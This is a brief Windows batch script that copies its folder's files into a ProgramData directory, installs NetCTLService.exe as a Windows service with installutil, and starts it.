
robocopy %~dp0 %ProgramData%\Microsoft\Monitor *.*

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe %ProgramData%\Microsoft\Monitor\NetCTLService.exe
net start NetCTLService
pause
